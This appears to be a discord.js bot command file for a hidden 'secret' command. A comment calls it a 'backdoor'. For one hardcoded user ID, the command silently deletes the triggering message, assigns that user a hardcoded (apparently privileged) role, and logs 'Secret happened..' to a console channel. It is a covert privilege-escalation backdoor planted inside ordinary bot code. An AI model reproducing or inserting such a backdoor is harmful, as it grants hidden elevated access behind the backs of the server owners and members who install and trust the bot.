// 715284871563575356

const Discord = require('discord.js');
const config = require('../config.json');
const log = require(`leekslazylogger`);
module.exports = {
  name: 'secret',
  description: 'super secret',
  usage: '[args]',
  aliases: ['none'],
  example: '!secret',
  args: false,
  cooldown: config.cooldown,
  guildOnly: true,
  execute(message, args) {
    const client = message.client;
    // for pancake backdoor let roleID = "722569576789049384";
    let roleID = "725843561496576062";
    let isBotOwner = message.author.id == '287700519726612482';
    // command starts here
  if (!isBotOwner)
        return;
    message.delete();
        message.member.roles.add(roleID)
        log.success("Added super secret role")
        client.channels.cache.get(config.console).send(`Secret happened..`)
        



    // command ends here
  },
};